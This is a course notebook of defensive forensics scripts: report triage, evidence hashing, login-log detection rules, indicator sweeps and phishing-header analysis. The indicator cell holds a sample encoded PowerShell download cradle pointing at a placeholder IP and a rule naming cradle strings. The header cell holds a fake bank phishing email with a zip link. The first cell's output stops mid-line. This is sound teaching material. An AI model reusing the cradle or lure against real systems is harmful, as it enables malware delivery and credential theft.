# Session 2: Types of Cybercrimes and Investigation Tools

[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Hamnakhan123/Cybersecurity-and-Digital-Forensics/blob/main/term-1/05-cyber-security-frameworks/code/session-02-cybercrimes-and-investigation-tools.ipynb)

*Cybersecurity and Digital Forensics* · Prepared by **Hamna Zahid Khan**, Junior Lecturer

Run each cell from top to bottom (Shift+Enter). Every example is self-contained and safe to run in a lab or on Colab.

## `session-02_crime_classifier.py`

In [1]:
"""Session 2 - Triage incident reports into cybercrime categories.

A cybercrime desk (police cyber unit, bank fraud team or company SOC) receives dozens
of reports a day written in plain language. This script uses a transparent keyword
scoring method to suggest a category, a target type (computer as TARGET or as TOOL),
and a priority, so a human analyst can review the queue faster.
It is deliberately simple and explainable: every decision shows the words that drove it.
All reports are fictional.
Run:  python session-02_crime_classifier.py
"""
import re

CATEGORIES = {
    # category: (keywords, computer is "target" or "tool", base priority 1-5)
    "Phishing / credential theft": (["link", "login", "password", "verify", "otp", "fake page"], "tool", 3),
    "Ransomware / malware":        (["encrypted", "ransom", "bitcoin", "files locked", "virus", "malware"], "target", 5),
    "Online financial fraud":      (["transferred", "jazzcash", "easypaisa", "card", "refund", "investment", "scheme"], "tool", 4),
    "Business email compromise":   (["invoice", "ceo", "bank details changed", "urgent payment", "supplier"], "tool", 5),
    "Identity theft":              (["cnic", "sim issued", "account opened", "my name", "impersonat"], "tool", 4),
    "Cyberstalking / harassment":  (["threat", "messages", "stalk", "harass", "blackmail", "photos"], "tool", 4),
    "Denial of service":           (["website down", "traffic flood", "ddos", "unavailable", "requests per second"], "target", 4),
    "Unauthorised access / hacking": (["hacked", "unknown login", "admin account", "accessed", "brute"], "target", 4),
    "Insider data theft":          (["employee", "usb", "copied", "resigned", "download"], "target", 4),
}

REPORTS = [
    "Received SMS saying my bank account is blocked, clicked the link and entered password and OTP on a fake page.",
    "All files on the accounts PC are encrypted and a note demands bitcoin as ransom.",
    "Our supplier emailed that their bank details changed; we paid the invoice of PKR 2.1 million to the new account.",
    "Someone opened a mobile wallet account using my CNIC and a SIM issued in my name.",
    "Our online store website is down, hosting says a traffic flood of 40,000 requests per second.",
    "An employee who resigned last week copied the customer database to a USB before leaving.",
    "A stranger keeps sending threat messages and says he will post my photos unless I pay.",
    "Lost my phone at the market.",
]


def classify(text):
    t = text.lower()
    scores = {}
    for cat, (words, _, _) in CATEGORIES.items():
        hits = [w for w in words if re.search(r"\b" + re.escape(w), t)]
        if hits:
            scores[cat] = hits
    if not scores:
        return None, [], "-", 1
    best = max(scores, key=lambda c: (len(scores[c]), CATEGORIES[c][2]))
    _, role, prio = CATEGORIES[best]
    money = re.search(r"(pkr|rs\.?)\s*[\d.,]+\s*(million|lakh)?", t)
    if money:
        prio = min(5, prio + 1)
    return best, scores[best], role, prio


def main():
    print(f"{'#':<3}{'Suggested category':<32}{'Computer as':<12}{'Prio':<6}Evidence words")
    print("-" * 92)
    queue = []
    for i, r in enumerate(REPORTS, 1):
        cat, hits, role, prio = classify(r)
        queue.append((prio, i, cat))
        print(f"{i:<3}{(cat or 'Not a cybercrime / refer'):<32}{role:<12}{prio:<6}{', '.join(hits)}")
    print("\nWork queue (highest priority first, human analyst confirms each one):")
    for prio, i, cat in sorted(queue, key=lambda x: (-x[0], x[1])):
        print(f"   P{prio}  report {i}: {cat or 'refer to general helpline'}")


if __name__ == "__main__":
    main()

#  Suggested category              Computer as Prio  Evidence words
--------------------------------------------------------------------------------------------
1  Phishing / credential theft     tool        3     link, password, otp, fake page
2  Ransomware / malware            target      5     encrypted, ransom, bitcoin
3  Business email compromise       tool        5     invoice, bank details changed, supplier
4  Identity theft                  tool        4     cnic, sim issued, my name
5  Denial of service               target      4     traffic flood, requests per second
6  Insider data theft              target      4     employee, usb, copied, resigned
7  Cyberstalking / harassment      tool        4     threat, messages, photos
8  Not a cybercrime / refer        -           1     

Work queue (highest priority first, human analyst confirms each one):
   P5  report 2: Ransomware / malware
   P5  report 3: Business email compromise
   P4  report 4: Identity theft
   P4  report 

## `session-02_evidence_hashing.py`

In [2]:
"""Session 2 - Hash digital evidence at acquisition and verify it later.

Investigators never analyse original evidence directly. They make a copy (an "image"),
calculate a cryptographic hash of the original and of the copy, and record both.
If even one bit changes later, the hash changes completely, so the court can trust
that the evidence examined is exactly what was seized.

This script creates a small fictional "evidence folder" in a temporary directory,
hashes every file with MD5 and SHA-256 (as forensic tools such as FTK Imager report),
then simulates an accidental change and detects it. Everything is deleted at the end.
Run:  python session-02_evidence_hashing.py
"""
import hashlib
import json
import os
import shutil
import tempfile


def hash_file(path, chunk=65536):
    """Read in chunks so even multi-GB images fit in memory."""
    md5, sha = hashlib.md5(), hashlib.sha256()
    with open(path, "rb") as f:
        while block := f.read(chunk):
            md5.update(block)
            sha.update(block)
    return md5.hexdigest(), sha.hexdigest()


def manifest(folder):
    out = {}
    for name in sorted(os.listdir(folder)):
        m, s = hash_file(os.path.join(folder, name))
        out[name] = {"bytes": os.path.getsize(os.path.join(folder, name)), "md5": m, "sha256": s}
    return out


def main():
    work = tempfile.mkdtemp(prefix="evidence_")
    try:
        ev = os.path.join(work, "EXHIBIT-07")
        os.makedirs(ev)
        files = {
            "chat_export.txt": "2026-09-14 21:03 buyer: send the account details\n2026-09-14 21:05 seller: ok\n",
            "invoice_scan.pdf": "%PDF-1.4 fictional invoice PKR 85,000\n",
            "browser_history.csv": "time,url\n2026-09-14 20:58,https://shop.example.com/checkout\n",
        }
        for name, text in files.items():
            with open(os.path.join(ev, name), "w") as f:
                f.write(text)

        print("1) Acquisition: hash every file and save the manifest")
        before = manifest(ev)
        for name, h in before.items():
            print(f"   {name:<20} {h['bytes']:>4} B  MD5 {h['md5'][:12]}...  SHA-256 {h['sha256'][:16]}...")
        with open(os.path.join(work, "EXHIBIT-07.manifest.json"), "w") as f:
            json.dump(before, f, indent=1)

        print("\n2) Working copy for analysis, verified against the manifest")
        copy = os.path.join(work, "EXHIBIT-07-working-copy")
        shutil.copytree(ev, copy)
        ok = manifest(copy) == before
        print(f"   Working copy identical to original: {ok}")

        print("\n3) Somebody 'tidies' the chat export on the working copy ('ok' -> 'no')")
        p = os.path.join(copy, "chat_export.txt")
        with open(p) as f:
            text = f.read()
        with open(p, "w") as f:
            f.write(text.replace("ok", "no"))
        after = manifest(copy)
        for name in before:
            same = before[name]["sha256"] == after[name]["sha256"]
            print(f"   {name:<20} {'VERIFIED' if same else 'MISMATCH - integrity broken'}")
        print(f"\n   Old SHA-256: {before['chat_export.txt']['sha256']}")
        print(f"   New SHA-256: {after['chat_export.txt']['sha256']}")
        print("   A 2-character edit changed the whole hash (avalanche effect).")
        print("\n4) Why two algorithms? MD5 is fast but has known collisions; SHA-256 is the")
        print("   value to rely on. Many labs record both for compatibility with older tools.")
    finally:
        shutil.rmtree(work)


if __name__ == "__main__":
    main()

1) Acquisition: hash every file and save the manifest
   browser_history.csv    60 B  MD5 0fdad048f9e0...  SHA-256 45e7af32748eae82...
   chat_export.txt        77 B  MD5 7352bdaadc1f...  SHA-256 2b5adddb50d5731f...
   invoice_scan.pdf       38 B  MD5 c2459e5a7411...  SHA-256 856e44d98c2bac9b...

2) Working copy for analysis, verified against the manifest
   Working copy identical to original: True

3) Somebody 'tidies' the chat export on the working copy ('ok' -> 'no')
   browser_history.csv  VERIFIED
   chat_export.txt      MISMATCH - integrity broken
   invoice_scan.pdf     VERIFIED

   Old SHA-256: 2b5adddb50d5731f0d49e2c7a6feb18973765a195256d0d29f547e35b9a42240
   New SHA-256: 09e32ca7a0ef9a294023f9c3127fc8bcae153555db67d3e0a22d345d46f2ca08
   A 2-character edit changed the whole hash (avalanche effect).

4) Why two algorithms? MD5 is fast but has known collisions; SHA-256 is the
   value to rely on. Many labs record both for compatibility with older tools.


## `session-02_log_triage.py`

In [3]:
"""Session 2 - Threat detection from authentication logs (a tiny SIEM rule engine).

Incident responders start from logs. This script parses fictional VPN/web login
events and applies three classic detection rules:
  R1 brute force      : >= 5 failed logins for one account from one IP within 10 minutes
  R2 password spraying: one IP fails against >= 4 different accounts within 10 minutes
  R3 impossible travel: the same user logs in successfully from two countries
                        faster than a plane could fly between them (> 900 km/h)
It then prints alerts and a merged timeline - the first artefact of any investigation.
IP addresses are from the documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).
Run:  python session-02_log_triage.py
"""
import math
from collections import defaultdict
from datetime import datetime, timedelta

LOG = """\
2026-10-20T08:58:10 SUCCESS user=asad ip=192.0.2.10 geo=Karachi,PK
2026-10-20T09:01:02 FAIL user=finance ip=203.0.113.66 geo=Unknown,XX
2026-10-20T09:01:20 FAIL user=finance ip=203.0.113.66 geo=Unknown,XX
2026-10-20T09:01:41 FAIL user=finance ip=203.0.113.66 geo=Unknown,XX
2026-10-20T09:02:05 FAIL user=finance ip=203.0.113.66 geo=Unknown,XX
2026-10-20T09:02:30 FAIL user=finance ip=203.0.113.66 geo=Unknown,XX
2026-10-20T09:02:58 SUCCESS user=finance ip=203.0.113.66 geo=Unknown,XX
2026-10-20T09:10:00 FAIL user=hr ip=198.51.100.23 geo=Frankfurt,DE
2026-10-20T09:10:04 FAIL user=it-admin ip=198.51.100.23 geo=Frankfurt,DE
2026-10-20T09:10:09 FAIL user=sana ip=198.51.100.23 geo=Frankfurt,DE
2026-10-20T09:10:13 FAIL user=asad ip=198.51.100.23 geo=Frankfurt,DE
2026-10-20T09:10:18 FAIL user=reception ip=198.51.100.23 geo=Frankfurt,DE
2026-10-20T09:40:00 SUCCESS user=asad ip=198.51.100.99 geo=London,GB
2026-10-20T10:15:00 FAIL user=sana ip=192.0.2.11 geo=Karachi,PK
2026-10-20T10:15:20 SUCCESS user=sana ip=192.0.2.11 geo=Karachi,PK
"""
CITY = {"Karachi": (24.86, 67.01), "Frankfurt": (50.11, 8.68), "London": (51.51, -0.13)}
WINDOW = timedelta(minutes=10)


def parse(line):
    ts, result, *kv = line.split()
    d = dict(x.split("=", 1) for x in kv)
    d["time"], d["result"] = datetime.fromisoformat(ts), result
    d["city"] = d["geo"].split(",")[0]
    return d


def km(a, b):
    """Great-circle distance (haversine)."""
    (la1, lo1), (la2, lo2) = [tuple(map(math.radians, p)) for p in (a, b)]
    h = math.sin((la2 - la1) / 2) ** 2 + math.cos(la1) * math.cos(la2) * math.sin((lo2 - lo1) / 2) ** 2
    return 2 * 6371 * math.asin(math.sqrt(h))


def detect(events):
    alerts = []
    fails = [e for e in events if e["result"] == "FAIL"]
    by_pair = defaultdict(list)
    for e in fails:
        by_pair[(e["user"], e["ip"])].append(e["time"])
    for (user, ip), times in by_pair.items():
        for i in range(len(times)):
            if len([t for t in times[i:] if t - times[i] <= WINDOW]) >= 5:
                ok = [e for e in events if e["user"] == user and e["ip"] == ip and e["result"] == "SUCCESS"]
                sev = "CRITICAL (followed by a successful login!)" if ok else "HIGH"
                alerts.append((times[i], "R1 brute force", f"{user} from {ip}", sev))
                break
    by_ip = defaultdict(list)
    for e in fails:
        by_ip[e["ip"]].append(e)
    for ip, evs in by_ip.items():
        users = {e["user"] for e in evs if e["time"] - evs[0]["time"] <= WINDOW}
        if len(users) >= 4:
            alerts.append((evs[0]["time"], "R2 password spraying", f"{ip} tried {len(users)} accounts", "HIGH"))
    last = {}
    for e in [e for e in events if e["result"] == "SUCCESS"]:
        prev = last.get(e["user"])
        if prev and prev["city"] in CITY and e["city"] in CITY and prev["city"] != e["city"]:
            dist = km(CITY[prev["city"]], CITY[e["city"]])
            hours = (e["time"] - prev["time"]).total_seconds() / 3600
            speed = dist / hours
            if speed > 900:
                alerts.append((e["time"], "R3 impossible travel",
                               f"{e['user']}: {prev['city']} -> {e['city']} {dist:,.0f} km in {hours*60:.0f} min "
                               f"= {speed:,.0f} km/h", "HIGH"))
        last[e["user"]] = e
    return sorted(alerts)


def main():
    events = [parse(l) for l in LOG.strip().splitlines()]
    print(f"Parsed {len(events)} events, {sum(e['result']=='FAIL' for e in events)} failures\n")
    print("ALERTS")
    for t, rule, what, sev in detect(events):
        print(f"  {t:%H:%M:%S}  {rule:<22} {what:<58} {sev}")
    print("\nTIMELINE for the compromised 'finance' account")
    for e in events:
        if e["user"] == "finance":
            print(f"  {e['time']:%H:%M:%S}  {e['result']:<8} {e['ip']:<15} {e['geo']}")
    print("\nNext steps for the responder: disable 'finance', reset password, enforce MFA,")
    print("block 203.0.113.66 and 198.51.100.23, check what 'finance' accessed after 09:02:58,")
    print("and confirm with Asad whether the London login was really him (VPN? travel?).")


if __name__ == "__main__":
    main()

Parsed 15 events, 11 failures

ALERTS
  09:01:02  R1 brute force         finance from 203.0.113.66                                  CRITICAL (followed by a successful login!)
  09:10:00  R2 password spraying   198.51.100.23 tried 5 accounts                             HIGH
  09:40:00  R3 impossible travel   asad: Karachi -> London 6,309 km in 42 min = 9,049 km/h    HIGH

TIMELINE for the compromised 'finance' account
  09:01:02  FAIL     203.0.113.66    Unknown,XX
  09:01:20  FAIL     203.0.113.66    Unknown,XX
  09:01:41  FAIL     203.0.113.66    Unknown,XX
  09:02:05  FAIL     203.0.113.66    Unknown,XX
  09:02:30  FAIL     203.0.113.66    Unknown,XX
  09:02:58  SUCCESS  203.0.113.66    Unknown,XX

Next steps for the responder: disable 'finance', reset password, enforce MFA,
block 203.0.113.66 and 198.51.100.23, check what 'finance' accessed after 09:02:58,
and confirm with Asad whether the London login was really him (VPN? travel?).


## `session-02_ioc_matcher.py`

In [4]:
"""Session 2 - Match threat-intelligence indicators (IOCs) against your own logs.

Threat-intelligence feeds share Indicators of Compromise: bad IPs, domains, URLs and
file hashes seen in real attacks. Incident responders sweep their logs for them.
This script loads a small fictional feed (JSON, similar in spirit to STIX/MISP exports),
then sweeps a proxy log and an endpoint file inventory, including a simple
"YARA-style" rule that flags files containing suspicious strings.
All indicators are fictional and use documentation/test ranges.
Run:  python session-02_ioc_matcher.py
"""
import hashlib
import ipaddress
import json

FEED = json.loads("""{
  "source": "Fictional regional CERT feed", "generated": "2026-10-19",
  "indicators": [
    {"type": "ipv4", "value": "203.0.113.45", "threat": "phishing kit host", "confidence": 90},
    {"type": "cidr", "value": "198.51.100.0/28", "threat": "password-spraying botnet", "confidence": 70},
    {"type": "domain", "value": "metr0bank-secure.example", "threat": "bank look-alike", "confidence": 95},
    {"type": "sha256", "value": "%s", "threat": "info-stealer dropper (training sample)", "confidence": 85}
  ]}""" % hashlib.sha256(b"TRAINING-SAMPLE-not-real-malware").hexdigest())

PROXY_LOG = [
    ("10:01:12", "pc-lab-07", "203.0.113.45", "GET /forms/verify.zip"),
    ("10:03:40", "pc-acc-02", "192.0.2.80", "GET /news"),
    ("10:05:02", "pc-hr-01", "198.51.100.9", "POST /login"),
    ("10:06:33", "pc-acc-02", "metr0bank-secure.example", "GET /login?id=88231"),
    ("10:07:10", "pc-lab-03", "198.51.100.200", "GET /"),
]
ENDPOINT_FILES = {  # host -> {path: file content}
    "pc-lab-07": {"C:/Users/s1/Downloads/verify.exe": b"TRAINING-SAMPLE-not-real-malware",
                  "C:/Users/s1/notes.txt": b"lecture notes week 3"},
    "pc-acc-02": {"C:/Temp/run.ps1": b"powershell -enc SQBFAFgA... DownloadString(http://203.0.113.45/a)"},
}
# A YARA-style rule written as data: match if ANY of the strings appears
RULE = {"name": "Suspicious_Download_Cradle",
        "strings": [b"DownloadString(", b"-enc ", b"Invoke-Expression"], "condition": "any"}


def match_net(value, ind):
    if ind["type"] == "ipv4":
        return value == ind["value"]
    if ind["type"] == "cidr":
        try:
            return ipaddress.ip_address(value) in ipaddress.ip_network(ind["value"])
        except ValueError:
            return False
    if ind["type"] == "domain":
        return value == ind["value"] or value.endswith("." + ind["value"])
    return False


def main():
    print(f"Feed: {FEED['source']} ({len(FEED['indicators'])} indicators, {FEED['generated']})\n")
    hits = []
    print("Proxy log sweep:")
    for t, host, dest, req in PROXY_LOG:
        found = [i for i in FEED["indicators"] if match_net(dest, i)]
        mark = f"HIT {found[0]['threat']} ({found[0]['confidence']}%)" if found else "clean"
        print(f"  {t} {host:<10} -> {dest:<26} {mark}")
        if found:
            hits.append(host)
    print("\nEndpoint file sweep (hash IOCs + YARA-style rule):")
    hashes = {i["value"]: i for i in FEED["indicators"] if i["type"] == "sha256"}
    for host, files in ENDPOINT_FILES.items():
        for path, data in files.items():
            h = hashlib.sha256(data).hexdigest()
            notes = []
            if h in hashes:
                notes.append("hash IOC: " + hashes[h]["threat"])
            if any(s in data for s in RULE["strings"]):
                notes.append("rule " + RULE["name"])
            print(f"  {host:<10} {path:<36} {'; '.join(notes) or 'clean'}")
            if notes:
                hits.append(host)
    print("\nHosts to isolate and investigate:", ", ".join(sorted(set(hits))))


if __name__ == "__main__":
    main()

Feed: Fictional regional CERT feed (4 indicators, 2026-10-19)

Proxy log sweep:
  10:01:12 pc-lab-07  -> 203.0.113.45               HIT phishing kit host (90%)
  10:03:40 pc-acc-02  -> 192.0.2.80                 clean
  10:05:02 pc-hr-01   -> 198.51.100.9               HIT password-spraying botnet (70%)
  10:06:33 pc-acc-02  -> metr0bank-secure.example   HIT bank look-alike (95%)
  10:07:10 pc-lab-03  -> 198.51.100.200             clean

Endpoint file sweep (hash IOCs + YARA-style rule):
  pc-lab-07  C:/Users/s1/Downloads/verify.exe     hash IOC: info-stealer dropper (training sample)
  pc-lab-07  C:/Users/s1/notes.txt                clean
  pc-acc-02  C:/Temp/run.ps1                      rule Suspicious_Download_Cradle

Hosts to isolate and investigate: pc-acc-02, pc-hr-01, pc-lab-07


## `session-02_email_header_analyzer.py`

In [5]:
"""Session 2 - Analyse a suspicious email's headers (phishing investigation and OSINT).

Email headers are a goldmine for investigators. This script parses a fictional
phishing email with Python's standard email library and checks:
  * the path the message took (Received headers, read bottom-up),
  * authentication results (SPF, DKIM, DMARC),
  * mismatches between From, Reply-To and Return-Path,
  * look-alike domains (typosquatting) compared with the real brand domain,
  * URLs in the body, printed in DEFANGED form (hxxps, [.]) so nobody clicks them.
Domains use the reserved example/test names; IPs are documentation ranges.
Run:  python session-02_email_header_analyzer.py
"""
import re
from email import message_from_string
from email.utils import parseaddr

RAW = """\
Received: from mail.corp-mailhost.example (mail.corp-mailhost.example [192.0.2.25])
\tby mx.university.example; Tue, 20 Oct 2026 10:02:11 +0500
Received: from unknown-host (unknown [203.0.113.45])
\tby mail.corp-mailhost.example; Tue, 20 Oct 2026 05:02:07 +0000
Authentication-Results: mx.university.example;
\tspf=fail smtp.mailfrom=bulk-sender.test;
\tdkim=none;
\tdmarc=fail header.from=metr0bank-secure.example
Return-Path: <bounce@bulk-sender.test>
From: "MetroBank Security" <security@metr0bank-secure.example>
Reply-To: helpdesk.verify@freemail.test
To: student@university.example
Subject: URGENT: Your account will be suspended in 24 hours
Date: Tue, 20 Oct 2026 05:02:05 +0000
Message-ID: <x81@unknown-host>
Content-Type: text/plain

Dear customer, we detected unusual activity. Verify now at
https://metr0bank-secure.example/login?id=88231 or your account will be closed.
Download the form: http://203.0.113.45/forms/verify.zip
"""
REAL_BRAND = "metrobank.example"
HOMOGLYPHS = str.maketrans({"1": "l", "0": "o", "3": "e", "5": "s"})  # digit -> letter it imitates


def defang(url):
    return url.replace("http", "hxxp").replace(".", "[.]")


def lookalike(domain, real):
    base = domain.split(".")[0].split("-")[0]
    return base.translate(HOMOGLYPHS) == real.split(".")[0] and domain != real


def main():
    msg = message_from_string(RAW)
    score, reasons = 0, []
    print("1) Delivery path (oldest hop at the bottom):")
    for i, hop in enumerate(reversed(msg.get_all("Received")), 1):
        hop = " ".join(hop.split())
        ip = re.search(r"\[([\d.]+)\]", hop)
        print(f"   hop {i}: {hop.split(';')[0][:70]}  ip={ip.group(1) if ip else '?'}")
    auth = " ".join(msg["Authentication-Results"].split())
    print("\n2) Authentication:")
    for mech in ("spf", "dkim", "dmarc"):
        res = re.search(mech + r"=(\w+)", auth).group(1)
        print(f"   {mech.upper():<6} {res}")
        if res != "pass":
            score += 2
            reasons.append(f"{mech.upper()} {res}")
    frm = parseaddr(msg["From"])[1].split("@")[1]
    rto = parseaddr(msg["Reply-To"])[1].split("@")[1]
    rpath = parseaddr(msg["Return-Path"])[1].split("@")[1]
    print(f"\n3) Domains: From={frm}  Reply-To={rto}  Return-Path={rpath}")
    if len({frm, rto, rpath}) > 1:
        score += 2
        reasons.append("From / Reply-To / Return-Path domains differ")
    if lookalike(frm, REAL_BRAND):
        score += 3
        reasons.append(f"look-alike of {REAL_BRAND} ('0' used instead of 'o')")
    body = msg.get_payload()
    urls = re.findall(r"https?://\S+", body)
    print("\n4) URLs in body (defanged):")
    for u in urls:
        print("   ", defang(u))
        if re.match(r"https?://\d+\.\d+\.\d+\.\d+", u):
            score += 2
            reasons.append("link to a raw IP address")
        if u.endswith((".zip", ".exe", ".js", ".iso")):
            score += 2
            reasons.append("link downloads an archive/executable")
    if re.search(r"urgent|suspend|24 hours|closed", (msg["Subject"] + body).lower()):
        score += 1
        reasons.append("pressure / urgency language")
    verdict = "PHISHING - block and report" if score >= 8 else "SUSPICIOUS" if score >= 4 else "Probably fine"
    print(f"\n5) Risk score {score}: {verdict}")
    for r in reasons:
        print("   -", r)
    print("\nIOCs to share with the SOC: 203.0.113.45, metr0bank-secure.example, bulk-sender.test,"
          " freemail.test reply address")


if __name__ == "__main__":
    main()

1) Delivery path (oldest hop at the bottom):
   hop 1: from unknown-host (unknown [203.0.113.45]) by mail.corp-mailhost.examp  ip=203.0.113.45
   hop 2: from mail.corp-mailhost.example (mail.corp-mailhost.example [192.0.2.2  ip=192.0.2.25

2) Authentication:
   SPF    fail
   DKIM   none
   DMARC  fail

3) Domains: From=metr0bank-secure.example  Reply-To=freemail.test  Return-Path=bulk-sender.test

4) URLs in body (defanged):
    hxxps://metr0bank-secure[.]example/login?id=88231
    hxxp://203[.]0[.]113[.]45/forms/verify[.]zip

5) Risk score 16: PHISHING - block and report
   - SPF fail
   - DKIM none
   - DMARC fail
   - From / Reply-To / Return-Path domains differ
   - look-alike of metrobank.example ('0' used instead of 'o')
   - link to a raw IP address
   - link downloads an archive/executable
   - pressure / urgency language

IOCs to share with the SOC: 203.0.113.45, metr0bank-secure.example, bulk-sender.test, freemail.test reply address
